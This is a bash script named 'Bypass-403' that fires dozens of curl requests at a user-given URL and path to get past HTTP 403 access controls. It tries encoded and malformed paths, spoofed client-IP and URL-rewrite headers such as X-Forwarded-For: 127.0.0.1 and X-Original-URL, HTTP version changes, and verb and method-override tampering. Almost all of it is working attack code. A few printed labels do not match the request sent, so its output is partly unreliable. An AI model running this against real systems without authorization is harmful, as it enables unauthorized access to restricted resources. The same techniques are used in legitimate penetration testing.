#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "

# Usage
if [[ -z $1 && -z $2 ]];then
    exit
fi

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"

# Path bypasses
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/..
echo "  --> ${1}/./${2}/.."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/\;/$2
echo "  --> ${1}/;/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/.\;/$2
echo "  --> ${1}/.;${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//\;//$2
echo "  --> ${1}//;//${2}"

# Location payloads
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: localhost" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: localhost"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Forwarded-For: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Forwarded-For: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-Addr: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Cluster-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H True-Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: google.com" $1/$2
echo "  --> ${1}/${2} -H Host: google.com"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Via: 1.0 fred, 1.1 127.0.0.1" $1/$2
echo "  --> ${1}/${2} Via: 1.0 fred, 1.1 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Connection: close" -H "X-Forwarded-For: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Connection: close -H X-Forwarded-For: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /$2/whatever" $1/$2 # This
echo "  --> ${1}/${2} -H X-Original-URL: ${2}/console"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2/whatever" $1 # and this one gives 200 too, you must the result manually
echo "  --> ${1} -H X-rewrite-url: ${2}/console"

#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'

# HTTP Version
curl --http0.9 -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2} --http0.9"
curl --http1.0 -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2} --http1.0"
curl --http1.1 -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2} --http1.1"
curl --http2 -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2} --http2"
curl --http2-prior-knowledge -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2} --http2-prior-knowledge"

# Verb payloads
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PUT $1/$2
echo "  --> ${1}/${2}  -X PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PATCH $1/$2
echo "  --> ${1}/${2}  -X PATCH"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X OPTIONS $1/$2
echo "  --> ${1}/${2}  -X OPTIONS"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X DELETE $1/$2
echo "  --> ${1}/${2}  -X DELETE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X CONNECT $1/$2
echo "  --> ${1}/${2}  -X CONNECT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X CUSTOM $1/$2
echo "  --> ${1}/${2}  -X CUSTOM"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: POST" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: PUT" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: PATCH" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: PATCH"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: DELETE" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: DELETE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: CONNECT" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: CONNECT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: CUSTOM" $1/$2
echo "  --> ${1}/${2}  X-HTTP-Method-Override: CUSTOM"
